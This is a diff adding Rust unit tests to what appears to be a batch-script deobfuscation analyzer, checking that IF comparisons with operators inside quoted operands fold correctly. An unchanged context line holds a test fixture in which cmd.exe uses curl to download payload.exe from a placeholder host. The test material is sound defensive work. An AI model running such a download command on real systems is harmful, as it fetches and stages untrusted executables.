@@ -9582,6 +9582,26 @@ mod if_tests {
     }
 
     #[test]
+    fn if_eq_operator_inside_quoted_lhs_is_not_split() {
+        let script = b"if \"left==text\"==\"left==text\" set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "quoted LHS containing == did not run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { condition } if condition.contains("left==text"))),
+            "quoted LHS containing == should fold cleanly: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn if_cmd_child_preserves_delayed_expansion() {
         let script = br#"if "a"=="a" cmd.exe /V:ON /c "set U=https://if-wrapper.example/payload.exe&&curl -o payload.exe !U!""#;
         let report = analyze(script, &Config::default());
@@ -10225,6 +10245,28 @@ mod if_constant_fold_tests {
         assert!(
             !has_unresolved,
             "quoted EQU comparison with spaces should fold cleanly: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn if_equ_operator_word_inside_quoted_lhs_is_not_split() {
+        let script =
+            b"if \"left equ text\" EQU \"left equ text\" set MARK=value\r\necho %MARK%\r\n";
+        let report = analyze(script, &Config::default());
+        assert!(
+            report.deobfuscated.contains("echo value"),
+            "quoted LHS containing operator word did not run inline body:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+        let has_unresolved = report
+            .traits
+            .iter()
+            .any(|t| matches!(t, crate::traits::Trait::IfNotResolved { .. }));
+        assert!(
+            !has_unresolved,
+            "quoted LHS containing operator word should fold cleanly: {:?}",
             report.traits
         );
     }
